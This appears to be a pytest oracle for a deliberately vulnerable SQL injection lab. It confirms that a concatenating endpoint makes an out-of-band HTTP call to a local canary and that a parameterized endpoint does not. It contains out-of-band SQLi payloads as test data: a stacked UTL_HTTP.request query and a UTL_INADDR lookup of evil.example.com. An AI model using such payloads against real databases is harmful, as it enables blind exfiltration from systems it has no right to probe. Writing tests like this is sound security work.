# ==============================================================================
# INDEPENDENT ground-truth suite for the SQLI Target.
#
# THIS FILE IS THE ORACLE. With NO involvement from the confirmation engine, it proves against the
# live app's real behavior that:
#   * GET /report (REAL) concatenates the id into the SQL text, so an injected OOB primitive that names
#     a URL drives the simulated DBMS to reach out — a local "canary" server receives the hit; and
#   * GET /report-safe (SECURE) binds the id as a parameter, so the injected primitive never reaches the
#     SQL text the DBMS parses and the canary is NEVER hit.
#
# A local HTTP canary stands in for the out-of-band server, so the oracle needs no interactsh and no
# network beyond loopback. It must be green BEFORE the sqli confirmer is pointed at this lab. Style
# mirrors the other labs' test_vulns.py (fastapi TestClient); no engine imports.
#
# Run:  pytest sqli_target/test_vulns.py -v
# ==============================================================================
import os
import sys
import threading
from http.server import BaseHTTPRequestHandler
from socketserver import TCPServer

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from sqli_target.main import app  # noqa: E402

_HITS = []  # paths the canary received (proof the injected SQL primitive drove a server-side reach-out)


class _CanaryHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        _HITS.append(self.path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"canary-ok")

    def log_message(self, *a):  # silence
        pass


@pytest.fixture
def canary():
    _HITS.clear()
    server = TCPServer(("127.0.0.1", 0), _CanaryHandler)
    port = server.server_address[1]
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    try:
        yield f"http://127.0.0.1:{port}/sqli-probe"
    finally:
        server.shutdown()
        server.server_close()


@pytest.fixture
def client():
    with TestClient(app) as c:
        yield c


# An OOB SQLi payload: a stacked query invoking an Oracle-style HTTP primitive that names the canary URL
# — the simulated DBMS reaches out when it parses this in the (concatenated) SQL text.
def _oob_payload(url: str) -> str:
    return f"1; SELECT UTL_HTTP.request('{url}')"


# -----------------------------------------------------------------------------
# REAL — GET /report concatenates the id, so the injected primitive drives a reach-out (canary hit).
# -----------------------------------------------------------------------------
def test_REAL_report_reaches_out_on_injected_oob_primitive(client, canary):
    r = client.get("/report", params={"id": _oob_payload(canary)})
    assert r.status_code == 200 and r.json()["executed"] is True
    assert any("/sqli-probe" in h for h in _HITS)          # the DBMS really reached out — blind SQLi


def test_REAL_report_benign_id_does_not_reach_out(client, canary):
    # `canary` is taken only to reset _HITS to a clean slate (its URL is unused here).
    r = client.get("/report", params={"id": "42"})
    assert r.status_code == 200 and r.json()["executed"] is True
    assert _HITS == []                                     # a plain id triggers no OOB lookup


# -----------------------------------------------------------------------------
# SECURE — GET /report-safe binds the id, so the injected primitive never reaches the SQL text.
# -----------------------------------------------------------------------------
def test_SAFE_report_parameterized_never_reaches_out(client, canary):
    r = client.get("/report-safe", params={"id": _oob_payload(canary)})
    assert r.status_code == 200                            # runs, but the id is bound data, not SQL
    assert _HITS == []                                     # canary NEVER hit — parameterization defeats it


def test_SAFE_report_ignores_a_bare_domain_primitive(client, canary):
    # even an Oracle UTL_INADDR-style primitive naming a host is inert when the id is parameterized.
    r = client.get("/report-safe", params={"id": "1 OR UTL_INADDR.get_host_address('evil.example.com')"})
    assert r.status_code == 200
    assert _HITS == []
